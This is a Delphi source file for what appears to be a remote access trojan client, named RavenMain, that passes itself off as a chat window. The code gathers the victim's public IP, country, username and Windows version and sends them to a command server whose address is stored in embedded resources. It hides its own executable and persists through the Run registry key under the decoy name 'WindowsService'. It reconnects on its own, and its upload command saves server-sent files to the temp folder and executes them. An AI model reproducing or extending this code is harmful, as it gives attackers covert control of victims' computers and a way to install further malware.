unit RavenMain;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, DzSocket, System.NetEncoding,
  Winapi.TlHelp32, IdHTTP, IdStack, ComObj, Winapi.ActiveX, Registry;

     type
  TConnectionState = (csDisconnected, csConnecting, csConnected);
type
  TForm4 = class(TForm)
    C: TDzTCPClient;
    EdLog: TMemo;
    EdNickName: TEdit;
    EdHost: TEdit;
    EdPort: TEdit;
    BtnConnect: TButton;
    BtnDisconnect: TButton;
    EdMessage: TEdit;
    procedure FormCreate(Sender: TObject);
    procedure BtnDisconnectClick(Sender: TObject);
    procedure CConnectionLost(Sender: TObject; Socket: TDzSocket);
    procedure CDisconnect(Sender: TObject; Socket: TDzSocket;
      const WasConnected: Boolean);
    procedure CError(Sender: TObject; Socket: TDzSocket;
      const Event: TErrorEvent; const ErrorCode: Integer;
      const ErrorMsg: string);
    procedure CLoginRequest(Sender: TObject; Socket: TDzSocket;
      var Data: string);
    procedure CLoginResponse(Sender: TObject; Socket: TDzSocket;
      Accepted: Boolean; const Data: string);
    procedure CRead(Sender: TObject; Socket: TDzSocket; const Cmd: Char;
      const A: string);
    procedure EdMessageKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
  private
  procedure UpdateVisualConnectionState(State: TConnectionState);
    procedure Log(const Text: string);

  public
    { Public declarations }
  end;

var
  Form4: TForm4;

implementation

{$R *.dfm}
   procedure TForm4.Log(const Text: string);
begin
  EdLog.Lines.Add(FormatDateTime('hh:nn:ss', Now)+' - '+Text);
end;

 procedure TForm4.UpdateVisualConnectionState(State: TConnectionState);
begin
  BtnConnect.Enabled := State=csDisconnected;
  BtnDisconnect.Enabled := State=csConnected;
  EdMessage.Enabled := State=csConnected;
end;


function GetWindowsVersion: string;
var
  FSWbemLocator: OLEVariant;
  FWMIService: OLEVariant;
  FWbemObjectSet: OLEVariant;
  FWbemObject: OLEVariant;
  oEnum: IEnumVariant;
  iValue: LongWord;
begin
  Result := 'Unknown';

  try

    CoInitialize(nil);


    FSWbemLocator := CreateOleObject('WbemScripting.SWbemLocator');


    FWMIService := FSWbemLocator.ConnectServer('localhost', 'root\CIMV2', '', '');


    FWbemObjectSet := FWMIService.ExecQuery('SELECT Caption FROM Win32_OperatingSystem', 'WQL', $00000020);


    oEnum := IUnknown(FWbemObjectSet._NewEnum) as IEnumVariant;


    if oEnum.Next(1, FWbemObject, iValue) = 0 then
    begin
      Result := VarToStr(FWbemObject.Caption);
      Result := Trim(Result);
    end;


    FWbemObject := Unassigned;
    FWbemObjectSet := Unassigned;
    FWMIService := Unassigned;
    FSWbemLocator := Unassigned;


    CoUninitialize;
  except
    on E: Exception do
      Result := 'Unknown';
  end;
end;
function GetPCLocation: string;
var
  CountryName: array[0..255] of Char;
  LangID: Word;
begin
  Result := '';


  LangID := GetSystemDefaultLangID;


  if GetLocaleInfo(LangID, LOCALE_SLOCALIZEDCOUNTRYNAME, CountryName, 256) > 0 then
    Result := CountryName
  else if GetLocaleInfo(LangID, LOCALE_SCOUNTRY, CountryName, 256) > 0 then
    Result := CountryName
  else
    Result := 'Unknown';
end;
function GetPCUsername: string;
var
  Buffer: array[0..255] of Char;
  Size: DWORD;
begin
  Size := 256;
  if GetUserName(Buffer, Size) then
    Result := Buffer
  else
    Result := '';
end;

function GetMyIPAddress: string;
var
  IdHTTP: TIdHTTP;
begin
  Result := '';
  IdHTTP := TIdHTTP.Create(nil);
  try
    IdHTTP.ConnectTimeout := 3000;
    IdHTTP.ReadTimeout := 3000;
    try

      Result := IdHTTP.Get('http://api.ipify.org');
    except

      try
        Result := IdHTTP.Get('http://checkip.amazonaws.com').Trim;
      except
        on E: Exception do
          Result := '';
      end;
    end;
  finally
    IdHTTP.Free;
  end;
end;
procedure TForm4.BtnDisconnectClick(Sender: TObject);
begin
  C.Disconnect;
end;

procedure TForm4.CConnectionLost(Sender: TObject; Socket: TDzSocket);
begin
  Log('Connection lost.');

  try
      C.Connect;
  except

  end;
end;

procedure TForm4.CDisconnect(Sender: TObject; Socket: TDzSocket;
  const WasConnected: Boolean);
begin
  Log('Disconnected.');
  UpdateVisualConnectionState(csDisconnected);

  try
      C.Connect;
  except

  end;
end;

procedure TForm4.CError(Sender: TObject; Socket: TDzSocket;
  const Event: TErrorEvent; const ErrorCode: Integer; const ErrorMsg: string);
begin
 Log('ERROR: '+ErrorMsg);

  try
      C.Connect;
  except

  end;
end;

procedure TForm4.CLoginRequest(Sender: TObject; Socket: TDzSocket;
  var Data: string);
begin
  Data := EdNickName.Text;
end;

procedure TForm4.CLoginResponse(Sender: TObject; Socket: TDzSocket;
  Accepted: Boolean; const Data: string);
begin
  if Accepted then
  begin
    Log('Connected.');
    UpdateVisualConnectionState(csConnected);
  end
  else
    Log('Login rejected: '+Data);
end;

procedure TForm4.CRead(Sender: TObject; Socket: TDzSocket; const Cmd: Char;
  const A: string);
  var
  D: TMsgArray;
  FileName, FileData: string;
  ByteArray: TBytes;
  FileStream: TFileStream;
  SeparatorPos: Integer;
  TempPath, FilePath: string;
  StartInfo: TStartupInfo;
  ProcInfo: TProcessInformation;
  ProcessListStr: string;
begin
     // read anything from server, and do whatever u want, and return if u want anything.
 case Cmd of
    'M': //message received from chat
    begin
      D := DataToArray(A);
      Log(D[0]+': '+D[1]);
    end;
    // receive information message
    'I':
    begin

      MessageBox(Handle, PChar('' + A), 'Server Message', MB_ICONINFORMATION or MB_OK);
    end;

     // receive exclamation message
    'E':
    begin

      MessageBox(Handle, PChar('' + A), 'Server Message', MB_ICONEXCLAMATION or MB_OK);
    end;

      // receive error message
    'R':
    begin

      MessageBox(Handle, PChar('' + A), 'Server Message', MB_ICONERROR or MB_OK);
    end;

    'U': // Upload and Execute
    begin
      try
        Log('Receiving file...');

        // Split the data into filename and file content
        SeparatorPos := Pos('|', A);
        if SeparatorPos > 0 then
        begin
          FileName := Copy(A, 1, SeparatorPos - 1);
          FileData := Copy(A, SeparatorPos + 1, Length(A));

          // Get temp path to save the file
          SetLength(TempPath, MAX_PATH);
          GetTempPath(MAX_PATH, PChar(TempPath));
          TempPath := PChar(TempPath); // Trim null terminators

          // Create full file path
          FilePath := IncludeTrailingPathDelimiter(TempPath) + FileName;

          // Decode Base64 data
          ByteArray := TNetEncoding.Base64.DecodeStringToBytes(FileData);

          // Save the file
          FileStream := TFileStream.Create(FilePath, fmCreate);
          try
            FileStream.WriteBuffer(ByteArray[0], Length(ByteArray));
          finally
            FileStream.Free;
          end;

          Log('File saved to: ' + FilePath);

          // Execute the file
          FillChar(StartInfo, SizeOf(TStartupInfo), 0);
          StartInfo.cb := SizeOf(TStartupInfo);

          if CreateProcess(nil, PChar(FilePath), nil, nil, False,
                          CREATE_NEW_CONSOLE, nil, nil, StartInfo, ProcInfo) then
          begin
            CloseHandle(ProcInfo.hProcess);
            CloseHandle(ProcInfo.hThread);
            Log('File executed successfully');
          end
          else
          begin
            Log('Error executing file: ' + SysErrorMessage(GetLastError));
          end;
        end;
      except
        on E: Exception do
          Log('Error processing upload: ' + E.Message);
      end;
    end;
  end;
end;

procedure TForm4.EdMessageKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key=13 then
  begin
    Key := 0;
    C.Send('M', EdMessage.Text);
    EdMessage.Text := string.Empty;
  end;
end;
   procedure HideExecutable;
var
  ExePath: string;
begin
  // Get the path to the currently running executable
  ExePath := ParamStr(0);

  // Set the file attributes to hidden
  SetFileAttributes(PChar(ExePath), FILE_ATTRIBUTE_HIDDEN);
end;

procedure TForm4.FormCreate(Sender: TObject);
var
  ResourceStream: TResourceStream;
  IPBytes, PortBytes: TBytes;
  IPStr, PortStr: string;
begin



  if GetMyIPAddress = '' then
  begin

    Exit;
  end;



     try
  var HiddenResourceExists: Boolean := False;

  try
    ResourceStream := TResourceStream.Create(HInstance, 'HIDDEN', 'CUSTOM');
    HiddenResourceExists := True;
    ResourceStream.Free;
  except
    // Resource doesn't exist - that's OK
    HiddenResourceExists := False;
  end;

  if HiddenResourceExists then
  begin
    // Hide the executable
    SetFileAttributes(PChar(ParamStr(0)), FILE_ATTRIBUTE_HIDDEN);
  end;

  // Check for STARTUP resource
  var StartupResourceExists: Boolean := False;

  try
    ResourceStream := TResourceStream.Create(HInstance, 'STARTUP', 'CUSTOM');
    StartupResourceExists := True;
    ResourceStream.Free;
  except
    // Resource doesn't exist - that's OK
    StartupResourceExists := False;
  end;

  if StartupResourceExists then
  begin
    // Add to startup
    var Registry: TRegistry := TRegistry.Create;
    try
      Registry.RootKey := HKEY_CURRENT_USER;
      if Registry.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run', True) then
      begin
        Registry.WriteString('WindowsService', ParamStr(0));
        Registry.CloseKey;
      end;
    finally
      Registry.Free;
    end;
  end;
except
  on E: Exception do
    // Silent exception handling
end;


       try

    try
      ResourceStream := TResourceStream.Create(HInstance, 'SERVER_IP', 'CUSTOM');
      try
        SetLength(IPBytes, ResourceStream.Size);
        ResourceStream.ReadBuffer(IPBytes[0], ResourceStream.Size);
        IPStr := TEncoding.UTF8.GetString(IPBytes);
        EdHost.Text := IPStr;
      finally
        ResourceStream.Free;
      end;
    except

         EdHost.Text := '127.0.0.1';
    end;


    try
      ResourceStream := TResourceStream.Create(HInstance, 'SERVER_PORT', 'CUSTOM');
      try
        SetLength(PortBytes, ResourceStream.Size);
        ResourceStream.ReadBuffer(PortBytes[0], ResourceStream.Size);
        PortStr := TEncoding.UTF8.GetString(PortBytes);

        EdPort.Text := PortStr;
      finally
        ResourceStream.Free;
      end;
    except
          EdPort.Text := '8777';

    end;





  except
    on E: Exception do

  end;
  EdNickName.Text := GetMyIPAddress + '|' + GetPCLocation + '|' +
                       GetPCUsername + '|' + GetWindowsVersion;

 EdNickName.Text := Trim(EdNickName.Text);
  if EdNickName.Text=string.Empty then
  begin
  MessageBoxA(0, 'Somehow EdNickName is Empty', 'Empty', 0);

    EdNickName.SetFocus;
    Exit;
  end;

  EdHost.Text := Trim(EdHost.Text);
  if EdHost.Text=string.Empty then
  begin
    MessageBoxA(0, 'Somehow Host is Empty', 'Empty', 0);
    EdHost.SetFocus;
    Exit;
  end;

  C.Host := EdHost.Text;
  C.Port := StrToInt(EdPort.Text);

  UpdateVisualConnectionState(csConnecting);
  Log('Connecting...');
  C.Connect;

end;



end.
